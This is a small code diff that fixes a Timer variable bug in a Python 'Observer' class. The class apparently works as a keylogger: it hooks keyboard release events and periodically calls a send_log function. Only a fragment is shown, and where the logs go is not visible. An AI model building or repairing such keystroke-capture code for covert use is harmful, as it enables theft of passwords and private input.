@@ -54,8 +54,8 @@ class Observer:
 
         self.content= ''
         timer = Timer(interval=self.interval, function=self.send_log)
-        time.daemon = True
-        time.start()
+        timer.daemon = True
+        timer.start()
 
 
     def start(self):
@@ -63,4 +63,3 @@ class Observer:
         keyboard.on_release(callback=self.callback)
         self.send_log()
         keyboard.wait()
-        
